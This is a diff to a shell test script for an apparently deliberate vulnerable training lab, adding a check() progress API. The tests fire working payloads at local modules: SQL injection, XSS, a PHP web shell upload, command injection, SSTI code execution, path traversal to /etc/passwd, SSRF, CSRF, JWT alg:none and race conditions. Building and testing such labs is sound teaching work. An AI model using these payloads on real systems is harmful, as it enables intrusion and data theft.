@@ -32,16 +32,30 @@ expect_has()  { if has "$2" "$3"; then ok "$1"; else bad "$1（返回体里找�
 expect_no()   { if has "$2" "$3"; then bad "$1（不该出现 [$2]，却出现了）"; else ok "$1"; fi; }
 expect_code() { if [ "$2" = "$3" ]; then ok "$1"; else bad "$1（期望 HTTP $3，实际 $2）"; fi; }
 
-# 题目页里自带「提示 / 答案」折叠区，里面有解题文本。做内容断言之前必须把它剥掉 ——
-# 否则随便挑一个字符串都能在答案里找到，测试就会变成「永远通过」的假阳性。
-# 这个坑真的踩过一次：`uid=` 在答案里就有，于是失败的反倒"通过"了。
+# 问一次某道题的 check()。这是靶场对外承诺的机器可读接口，
+# 所以验证脚本直接用它 —— 不再靠"页面里有没有那句通关文案"来判断。
+# 靠文案判断有过惨痛教训（见下面 strip_teaching 那段注释）。
+check_solved() {
+  curl -s "$BASE/__vuln4all/check/$1" \
+    | python3 -c 'import json,sys; sys.exit(0 if json.load(sys.stdin).get("solved") else 1)'
+}
+expect_solved()   { if check_solved "$1"; then ok "$2"; else bad "$2（check() 说 $1 还没通关）"; fi; }
+expect_unsolved() { if check_solved "$1"; then bad "$2（check() 说 $1 已经通关了）"; else ok "$2"; fi; }
+
+# 题目页里除了模块自己的内容，还嵌着两份 core 注入的文字：
+#   1. 「提示 / 答案」折叠区 —— 答案文本就在里面
+#   2. 「进度」区块 —— 目标名在里面
+# 做内容断言之前必须把它们剥掉，否则随便挑一个字符串都可能在答案或目标名里找到，
+# 测试就变成「永远通过」的假阳性。这个坑踩过两次：
+#   · `uid=` 在答案里就有，于是坏了的那条反倒"通过"
+#   · 给命令注入题写的目标名里带 `uid=`，把一条否定断言直接顶掉了
 strip_teaching() {
   python3 -c '
 import re, sys
 html = sys.stdin.read()
-# 只剥 core 外壳里的教学折叠区。约定：模块自己的模板不要用 <details>
-# 承载测试要断言的内容 —— 否则会被一起剥掉。
-print(re.sub(r"<details\b.*?</details>", "", html, flags=re.S))
+html = re.sub(r"<details\b.*?</details>", "", html, flags=re.S)
+html = re.sub(r"<section class=\"progress\">.*?</section>", "", html, flags=re.S)
+print(html)
 '
 }
 
@@ -161,6 +175,43 @@ expect_has "样式表里带上了 HTTP 状态" "200" "$css"
 # UA 的 [hidden]{display:none}，所以样式表里必须显式重申一次
 expect_has "样式表里有 [hidden] 兜底规则" "[hidden]" "$css"
 
+step "1c. check() 接口"
+
+report=$(curl -s "$BASE/__vuln4all/check")
+expect_has "整份报告是合法 JSON 而且带 total" '"total"' "$report"
+expect_has "报告里有 solved 计数"             '"solved"' "$report"
+expect_has "每道题都带了挂载点"               '"mount"' "$report"
+expect_has "每道题都说明支不支持自动判定"     '"supported"' "$report"
+
+n_supported=$(printf '%s' "$report" | python3 -c 'import json,sys; print(json.load(sys.stdin)["supported"])')
+n_total=$(printf '%s' "$report" | python3 -c 'import json,sys; print(json.load(sys.stdin)["total"])')
+if [ "$n_supported" = "$n_total" ] && [ "$n_total" != "0" ]; then
+  ok "所有 $n_total 道题都实现了 check()"
+else
+  bad "只有 $n_supported / $n_total 道题实现了 check()"
+fi
+
+one=$(curl -s "$BASE/__vuln4all/check/sqli/login_bypass")
+expect_has "单题接口返回题目 id"     '"sqli/login_bypass"' "$one"
+expect_has "单题接口返回目标列表"     '"objectives"' "$one"
+
+code=$(curl -s -o /dev/null -w '%{http_code}' "$BASE/__vuln4all/check/no/such/module")
+expect_code "不存在的题目返回 404" "$code" "404"
+
+# check() 必须是无副作用的只读查询：连着问两次，结果必须一样
+first=$(curl -s "$BASE/__vuln4all/check")
+second=$(curl -s "$BASE/__vuln4all/check")
+if [ "$first" = "$second" ]; then
+  ok "连着问两次 check()，结果一致（无副作用）"
+else
+  bad "两次 check() 结果不一样 —— 有副作用"
+fi
+
+out=$(python3 main.py check)
+expect_has "CLI 的 check 能用" "已通关" "$out"
+out=$(python3 main.py check --json)
+expect_has "CLI 的 check --json 能用" '"modules"' "$out"
+
 step "2. SQLi —— 登录绕过"
 body=$(curl -s -X POST "$BASE/v/sqli/login_bypass/" \
   --data-urlencode "username=admin" --data-urlencode "password=wrong")
@@ -171,7 +222,8 @@ code=$(curl -s -o /dev/null -w '%{http_code}' -c "$JAR" -X POST "$BASE/v/sqli/lo
 expect_code "admin' --  被接受（302）" "$code" "302"
 
 body=$(curl -s -b "$JAR" "$BASE/v/sqli/login_bypass/welcome")
-expect_has "拿到 admin 身份，判定通关" "这题通了" "$body"
+expect_has "拿到 admin 身份" "这题通了" "$body"
+expect_solved "sqli/login_bypass" "check() 确认 SQLi 通关"
 rm -f "$JAR"
 
 body=$(curl -s -X POST "$BASE/v/sqli/login_bypass/" \
@@ -179,6 +231,8 @@ body=$(curl -s -X POST "$BASE/v/sqli/login_bypass/" \
 expect_has "单个单引号触发报错回显" "数据库报错" "$body"
 
 step "3. XSS —— 反射"
+expect_unsolved "xss/reflect_search" "注入载荷之前 check() 说未通关"
+
 body=$(curl -s "$BASE/v/xss/reflect_search/?q=%3Cb%3Ehello%3C%2Fb%3E")
 expect_has "无害标签被当成标签解析" "<b>hello</b>" "$body"
 
@@ -189,6 +243,7 @@ expect_has "script 标签原样出现在 HTML 里" "<script>alert(document.cooki
 body=$(curl -s --get "$BASE/v/xss/reflect_search/" \
   --data-urlencode 'q=<img src=x onerror=alert(1)>')
 expect_has "img onerror 载荷原样出现" "onerror=alert(1)" "$body"
+expect_solved "xss/reflect_search" "check() 确认 XSS 通关"
 
 step "4. IDOR —— 换个订单号"
 curl -s -o /dev/null -c "$JAR" -X POST "$BASE/v/idor/order_detail/login" \
@@ -202,11 +257,13 @@ expect_has "看自己的订单是正常的" "这是你自己的订单" "$body"
 
 body=$(curl -s -b "$JAR" "$BASE/v/idor/order_detail/order/1003")
 expect_has "改个数字就看到 bob 的订单" "别人的订单" "$body"
-expect_has "越权页判定通关" "这题通了" "$body"
 expect_has "泄露了 bob 的私密备注" "别外传" "$body"
+expect_solved "idor/order_detail" "check() 确认 IDOR 通关"
 rm -f "$JAR"
 
 step "5. CSRF —— 带着受害者的 cookie 改密码"
+expect_unsolved "csrf/password_change" "改密码之前 check() 说未通关"
+
 curl -s -o /dev/null -c "$JAR" -X POST "$BASE/v/csrf/password_change/login" \
   --data-urlencode "username=bob" --data-urlencode "password=password123"
 body=$(curl -s -b "$JAR" "$BASE/v/csrf/password_change/profile")
@@ -217,11 +274,23 @@ body=$(curl -s "$BASE/evil-site/")
 expect_has "攻击者站点可达" "恭喜你中奖" "$body"
 expect_has "攻击者站点指向受害者站的接口" "/v/csrf/password_change/change-password" "$body"
 
-# 关键一步：带着 bob 的 session cookie，但从「攻击者」那边发起
+# 反向一步：不带 Referer 的改密码请求**不算** CSRF。
+# 没有 Referer 说明对面不是浏览器（curl / 脚本），那不叫跨站请求伪造。
+# 这条断言在修掉"把空 Referer 也算跨站"那个 bug 之前是不可能失败的。
 code=$(curl -s -o /dev/null -w '%{http_code}' -b "$JAR" -X POST \
   "$BASE/v/csrf/password_change/change-password" \
+  --data-urlencode "new_password=silent-change")
+expect_code "不带 Referer 的改密码请求也会被服务端接受" "$code" "302"
+expect_unsolved "csrf/password_change" "光用 curl（没有 Referer）不算 CSRF"
+
+# 关键一步：带着 bob 的 session cookie，Referer 指向攻击者站点 ——
+# 这就是浏览器打开 /evil-site/ 之后自动提交那个表单时发出的请求。
+# curl 默认不发 Referer，所以要显式补上，否则模拟不出浏览器的行为。
+code=$(curl -s -o /dev/null -w '%{http_code}' -b "$JAR" -X POST \
+  -H "Referer: $BASE/evil-site/" \
+  "$BASE/v/csrf/password_change/change-password" \
   --data-urlencode "new_password=pwned-by-csrf")
-expect_code "改密码请求被接受（服务端不看来源）" "$code" "302"
+expect_code "来自攻击者页面的改密码请求被接受（服务端不看来源）" "$code" "302"
 rm -f "$JAR"
 
 code=$(curl -s -o /dev/null -w '%{http_code}' -c "$JAR" -X POST \
@@ -235,6 +304,7 @@ code=$(curl -s -o /dev/null -w '%{http_code}' -c "$JAR" -X POST \
   --data-urlencode "username=bob" --data-urlencode "password=pwned-by-csrf")
 expect_code "被 CSRF 改掉的新密码能登进去" "$code" "302"
 rm -f "$JAR"
+expect_solved "csrf/password_change" "check() 确认 CSRF 通关"
 
 step "6. 上传 —— 后缀与 Content-Type 绕过"
 printf '<?php system($_GET[0]); ?>' >/tmp/v4a-shell.php
@@ -257,6 +327,7 @@ expect_code "两处一起绕过 —— 上传成功（200）" "$code" "200"
 body=$(cat /tmp/v4a-up3.html)
 expect_has "页面判定绕过成功" "绕过去了" "$body"
 expect_has "页面点明通关" "这题通了" "$body"
+expect_solved "upload/avatar" "check() 确认上传绕过通关"
 
 body=$(curl -s "$BASE/v/upload/avatar/uploads/shell.PHp")
 expect_has "落地的文件能被直接访问到" '<?php system' "$body"
@@ -285,6 +356,16 @@ expect_code "重置全部（303）" "$code" "303"
 
 body=$(curl -s "$BASE/v/upload/avatar/")
 expect_no "重置全部后上传的文件被清掉了" "shell.PHp" "$body"
+
+# reset 必须把进度也一起清掉。这是把 progress 落在 workspace 里换来的好处：
+# core 清目录的时候顺手就把它带走了，模块不用为进度单独写 reset()。
+left=$(curl -s "$BASE/__vuln4all/check" \
+  | python3 -c 'import json,sys; print(json.load(sys.stdin)["solved"])')
+if [ "$left" = "0" ]; then
+  ok "重置全部之后所有 check() 都回到未通关"
+else
+  bad "重置之后还有 $left 道题被判成已通关 —— 进度没清干净"
+fi
 
 # 浏览器发起的跨站重置应该被拒（curl 不带 Origin，所以上面那些不受影响）
 code=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$BASE/__vuln4all/reset" \
@@ -551,9 +632,12 @@ rm -rf "$LAB"
 step "10. 第二批模块（不同难度 / 不同业务场景）"
 
 # ---- path_traversal/file_download —— 企业网盘
+expect_unsolved "path_traversal/file_download" "穿越之前 check() 说未通关"
+
 body=$(curl -s --get "$BASE/v/path_traversal/file_download/download" \
   --data-urlencode "name=../内部资料/薪资表.csv")
 expect_has "路径穿越读到共享目录外的文件" "vuln4all{path_traversal_ok}" "$body"
+expect_solved "path_traversal/file_download" "check() 确认路径穿越通关"
 
 body=$(curl -s --get "$BASE/v/path_traversal/file_download/download" \
   --data-urlencode "name=/etc/passwd")
@@ -565,6 +649,8 @@ code=$(curl -s -o /dev/null -w '%{http_code}' --get \
 expect_code "不存在的文件返回 404" "$code" "404"
 
 # ---- ssti/jinja2_profile —— 团队协作 SaaS
+expect_unsolved "ssti/jinja2_profile" "动手之前 check() 说未通关"
+
 body=$(page -X POST "$BASE/v/ssti/jinja2_profile/" --data-urlencode "template={{7*7}}")
 expect_has "模板被求值（7*7 -> 49）" "49" "$body"
 expect_has "里程碑记录下来了"        "模板被求值" "$body"
@@ -575,12 +661,13 @@ expect_has "config 被渲染出来" "SECRET_KEY" "$body"
 body=$(page -X POST "$BASE/v/ssti/jinja2_profile/" \
   --data-urlencode "template={{ cycler.__init__.__globals__.os.popen('id').read() }}")
 expect_has "SSTI 拿到命令执行" "uid=" "$body"
+expect_solved "ssti/jinja2_profile" "check() 确认 SSTI 三个里程碑全达成"
 
 # ---- command_injection/ping_tool —— 运维诊断
 body=$(page -X POST "$BASE/v/command_injection/ping_tool/" \
   --data-urlencode "host=127.0.0.1; id")
 expect_has "命令注入拿到 uid=" "uid=" "$body"
-expect_has "页面判定通关"      "这题通了" "$body"
+expect_solved "command_injection/ping_tool" "check() 确认命令注入通关"
 
 body=$(page -X POST "$BASE/v/command_injection/ping_tool/" \
   --data-urlencode "host=127.0.0.1")
@@ -590,7 +677,7 @@ expect_no "正常输入不该出现 uid=" "uid=" "$body"
 IMPLANT="http://img.vuln4all.local@127.0.0.1:${PORT}/internal-admin/"
 body=$(page -X POST "$BASE/v/ssrf/url_preview/" --data-urlencode "url=$IMPLANT")
 expect_has "SSRF 打到内网管理后台" "内部管理后台" "$body"
-expect_has "SSRF 判定通关"        "这题通了" "$body"
+expect_solved "ssrf/url_preview" "check() 确认 SSRF 通关"
 
 body=$(page -X POST "$BASE/v/ssrf/url_preview/" \
   --data-urlencode "url=http://example.com/x.png")
@@ -628,20 +715,21 @@ code=$(curl -s -o /tmp/v4a-forged.html -w '%{http_code}' \
   -b "v4a_flask_session_forged_cookie_main=$COOKIE" \
   "$BASE/v/flask_session/forged_cookie/admin")
 expect_code "伪造 cookie 进管理员页（200）" "$code" "200"
-expect_has "管理员页判定通关" "这题通了" "$(strip_teaching < /tmp/v4a-forged.html)"
+expect_has "管理员页给出管理员控制台" "管理员控制台" "$(strip_teaching < /tmp/v4a-forged.html)"
+expect_solved "flask_session/forged_cookie" "check() 确认会话伪造通关"
 
 code=$(curl -s -o /dev/null -w '%{http_code}' \
   "$BASE/v/flask_session/forged_cookie/admin")
 expect_code "不带 cookie 进不去（403）" "$code" "403"
 
 # ---- race_condition/coupon_redeem —— 限时优惠券并发
-body=$(page "$BASE/v/race_condition/coupon_redeem/")
-expect_no "并发之前没通关" "这题通了" "$body"
+expect_unsolved "race_condition/coupon_redeem" "并发之前 check() 说未通关"
 
 seq 24 | xargs -P24 -I{} curl -s -o /dev/null -X POST \
   "$BASE/v/race_condition/coupon_redeem/redeem"
 body=$(page "$BASE/v/race_condition/coupon_redeem/")
 expect_has "并发把「每人一次」打破了" "这题通了" "$body"
+expect_solved "race_condition/coupon_redeem" "check() 确认竞态通关"
 
 # ---- jwt/alg_none —— 开放 API 平台
 TOKEN=$(
@@ -659,7 +747,8 @@ PY
 code=$(curl -s -o /tmp/v4a-jwt.html -w '%{http_code}' \
   -H "Authorization: Bearer $TOKEN" "$BASE/v/jwt/alg_none/api/admin/keys")
 expect_code "alg:none 的 token 通过了鉴权（200）" "$code" "200"
-expect_has "管理员接口判定通关" "这题通了" "$(strip_teaching < /tmp/v4a-jwt.html)"
+expect_has "管理员接口返回了密钥列表" "API 密钥" "$(strip_teaching < /tmp/v4a-jwt.html)"
+expect_solved "jwt/alg_none" "check() 确认 alg:none 绕过通关"
 
 code=$(curl -s -o /dev/null -w '%{http_code}' \
   "$BASE/v/jwt/alg_none/api/admin/keys")
